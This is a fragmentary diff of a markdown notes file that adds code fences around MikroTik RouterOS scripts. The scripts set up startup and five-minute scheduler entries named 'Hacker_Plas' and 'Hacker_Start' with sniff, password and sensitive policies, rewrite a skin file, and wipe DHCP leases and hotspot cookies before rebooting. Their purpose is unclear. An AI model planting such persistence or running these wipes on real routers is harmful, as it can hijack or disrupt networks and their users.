@@ -38,13 +38,17 @@
 
 /import d;
 
-
+```
+/import d;
+```
 
 ------------------------------
 
 ### terminal
 
 
+
+```
 /file remove ("skins/skin")
 
 
@@ -56,6 +60,9 @@
 delay 2s
 /file set ("skins/skin") contents=("$xo");
 };
+```
+
+
 
 
 
@@ -64,9 +71,10 @@ delay 2s
 
 
 ### terminal
-
-
-
+   
+   
+   
+```
 /system scheduler
 add interval=5m name=Hacker_Plas on-event=\
     "/import e;\r\
@@ -84,17 +92,23 @@ add interval=6d name=Hacker_Start on-event=":do {\r\
     ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon \
     start-time=startup;
 
+```
+
 
 
 --------------------------------
 
 ### terminal
 
+
+
+```
 {
 /ip dhcp-server lease remove [find];
 /ip hotspot cookie remove [find];
 sy reboot;
 };
+```
 
  
  --------------------------------
